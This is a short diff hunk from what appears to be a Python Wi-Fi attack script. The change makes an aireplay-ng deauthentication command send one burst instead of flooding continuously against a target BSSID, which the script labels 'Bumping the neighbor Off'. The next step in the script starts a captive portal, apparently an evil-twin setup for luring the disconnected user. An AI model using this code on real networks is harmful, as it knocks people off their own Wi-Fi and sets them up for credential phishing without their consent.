@@ -118,7 +118,7 @@ try:
     
     #DEAUTH
     print("[I] Bumping the neighbor Off...")
-    subprocess.Popen(["aireplay-ng", "-0", "0", "-a", bssid, ap_iface])
+    subprocess.Popen(["aireplay-ng", "-0", "1", "-a", bssid, ap_iface])
 
     #CP
     print("[I] Starting captive portal")
